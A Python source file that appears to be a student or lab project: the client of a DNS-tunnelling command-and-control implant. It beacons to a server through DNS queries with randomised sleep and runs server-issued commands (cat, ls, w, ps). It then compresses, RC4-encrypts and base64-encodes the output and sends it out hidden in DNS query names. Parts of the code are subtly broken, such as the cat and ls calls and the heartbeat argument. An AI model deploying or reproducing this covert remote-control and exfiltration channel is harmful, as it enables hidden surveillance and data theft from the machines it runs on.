import base64
import math
import random
import subprocess
import time
import zlib
from arc4 import ARC4
from argparse import ArgumentParser
from typing import Tuple, Optional

import dns.resolver

from shared import serv_to_client, client_to_serv


class Client:
    def __init__(self, args):
        self.password = args.password
        self.silent = args.silent
        self.server_port = args.port
        self.server_ip = args.destination
        self.source_port = args.source_port

        # TODO: Change back... to [20, 100], [5,10]
        self.idle_timing = [5, 10]
        self.sending_timing = [1, 2]
        self.sending_data = False
        self.segments_to_send = []
        self.curr_seg_to_send = 0

        self.__log("Initializing...")

        self.sender = dns.resolver.Resolver()
        self.sender.nameservers = [self.server_ip]
        self.sender.nameserver_ports = {self.server_ip: self.server_port}

        self.__log("Initialized DNS sender with nameserver: {}".format(self.sender.nameserver_ports))

        self.running = False

    def __log(self, message):
        if self.silent:
            return
        print("CCC: {}".format(message))

    def server_registration(self):
        """
        Initializes communication with the server.
        """

        ret = self.hb()
        if ret is None:
            return False
        answer, arg = ret
        return answer == serv_to_client["ACK"]

    def do_sleep(self):
        if self.sending_data:
            minim, maxim = self.sending_timing
        else:
            minim, maxim = self.idle_timing

        ran = random.gauss((maxim + minim) / 2, math.log2(maxim - minim))
        t = max(minim, min(maxim, ran))
        self.__log("Sleeping for: {}s".format(t))
        time.sleep(t)

    def hb(self) -> Optional[Tuple[str, str]]:
        try:
            answer = self.sender.query(client_to_serv["HB"], "A", source_port=self.source_port)
            return answer.response.answer[0].items[0].address, ""  # TODO: ARG?????????????????????????
        except Exception:
            return None

    def do_send_hb(self):
        self.__log("HB")
        res = self.hb()

        if res is None:
            self.__log("No HB response!")
            return

        answer, arg = res

        if answer == serv_to_client["NOP"]:
            self.__log("NOP")
            return

        elif answer == serv_to_client["SD"]:
            self.__log("Server sent SD signal! Shutting down...")
            self.stop()

        self.carry_out_command(answer, arg)

    def carry_out_command(self, command, arg):
        self.__log("Carrying out command: {}, with args: {}".format(command, arg))

        if command == serv_to_client["NOP"]:
            self.__log("Got NOP.")
            return
        elif command == serv_to_client["CAT"]:
            output = subprocess.check_output("cat", arg)
        elif command == serv_to_client["LS"]:
            output = subprocess.check_output("ls", arg)
        elif command == serv_to_client["W"]:
            output = subprocess.check_output(['w', '-o'])
        elif command == serv_to_client["PS"]:
            output = subprocess.check_output(['ps', 'au'])

        else:
            self.__log("Unknown command: {}".format(command))
            return

        data = self.encrypt(output)
        segments = self.to_segments(data)
        self.segments_to_send = segments
        self.curr_seg_to_send = 0
        self.sending_data = True

    def to_segments(self, data):
        domain_len = len(client_to_serv["RESP"]) + 2
        max_len = 250 - domain_len  # DNS has max of 256 bytes
        max_size_of_part = int(min(max_len / 3, 63))
        part_count = math.ceil(len(data) / max_size_of_part)
        segment_count = math.ceil(part_count / 3)

        self.__log(
            "Total response length is: {}, while we can fit at most {} per part, "
            "which means {} per segment. Total segments: {}".format(len(data),
                                                                    max_size_of_part, 3 * max_size_of_part,
                                                                    segment_count))

        parts = [data[i:i + max_size_of_part] for i in range(0, len(data), max_size_of_part)]
        segments = ["{}.{}.{}.{}".format(parts[3 * i].decode("utf-8"), parts[3 * i + 1].decode("utf-8"),
                                         parts[3 * i + 2].decode("utf-8"), client_to_serv["RESP"]) for i
                    in range(0, len(parts) // 3)]

        if len(parts) % 3 != 0:
            last_seg = ""
            for i in range(0, len(parts) % 3):
                last_seg += "{}.".format(parts[i + (len(segments) * 3)].decode("utf-8"))
            last_seg += client_to_serv["RESP"]
            segments.append(last_seg)

        return segments

    def encrypt(self, data: bytes):
        # Compress to zip
        data = zlib.compress(bytes(data))
        cipher = ARC4(self.password).encrypt(data)
        encoded = base64.b64encode(cipher)
        encoded = encoded.replace(b"=", b"").replace(b"/", b"_").replace(b"+", b"-")
        return encoded

    def eos(self):
        self.__log("Sending EOS signal...")
        try:
            answer = self.sender.query(client_to_serv["DONE"], "A", source_port=self.source_port)
            return answer.response.answer[0].items[0].address
        except Exception:
            return None

    def do_sending_data(self):

        if self.curr_seg_to_send == len(self.segments_to_send):
            # Send the end of stream notification:
            ret = self.eos()
            if ret == serv_to_client["ACK"]:
                self.sending_data = False
            else:
                self.__log("Something went wrong! Start sending again!")
                self.curr_seg_to_send = 0
        else:
            # Send next segment
            ret = self.resp()
            if ret == serv_to_client["ACK"]:
                self.curr_seg_to_send += 1

    def resp(self):
        self.__log("Sending RESP no:{} with data: {}".format(self.curr_seg_to_send,
                                                             self.segments_to_send[self.curr_seg_to_send]))
        try:
            answer = self.sender.query(self.segments_to_send[self.curr_seg_to_send], "A", source_port=self.source_port)
            return answer.response.answer[0].items[0].address
        except Exception:
            return None

    def run(self):
        if self.running:
            return
        self.running = True

        # Register with the server:
        if not self.server_registration():
            self.__log("We got an invalid response for our initial heartbeat! Shutting down...")
            self.stop()
            return

        # Initialized correctly..  Start sending heartbeat
        while self.running:
            self.do_sleep()
            self.__log("Tick")
            if self.sending_data:
                self.do_sending_data()
            else:
                self.do_send_hb()

    def stop(self):
        if not self.running:
            return
        self.running = False


if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument("-pass", "--password", help="The password used to encrypt the communication", type=str,
                        default="heslo")
    parser.add_argument("-s", "--silent", help="Hide detailed debug info", type=bool, default=False)
    parser.add_argument("-d", "--destination", help="Destination server IP", type=str, default="127.0.0.1")
    parser.add_argument("-p", "--port", help="Destination server port", type=int, default=51271)  # TODO: Arbitrary...
    parser.add_argument("-sp", "--source-port", help="Source port", type=int, default=51272)  # TODO: Arbitrary
    args = parser.parse_args()

    client = Client(args)
    client.run()
